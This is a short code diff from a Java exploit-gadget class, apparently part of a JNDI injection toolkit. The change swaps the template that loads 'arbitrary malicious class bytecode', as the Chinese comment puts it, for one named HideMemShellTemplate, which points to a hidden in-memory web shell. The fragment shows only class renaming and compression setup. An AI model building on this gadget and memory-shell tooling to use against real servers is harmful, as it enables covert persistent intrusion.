@@ -141,7 +141,7 @@ public class Gadgets {
 
         // 如果 bytes 不为空，则使用 ClassLoaderTemplate 加载任意恶意类字节码
         if (bytes != null) {
-            ctClass = pool.get("com.nu1r.jndi.template.ClassLoaderTemplate");
+            ctClass = pool.get("com.qi4l.jndi.template.HideMemShellTemplate");
             ctClass.setName(ClassNameUtils.generateClassName());
             ByteArrayOutputStream outBuf           = new ByteArrayOutputStream();
             GZIPOutputStream      gzipOutputStream = new GZIPOutputStream(outBuf);
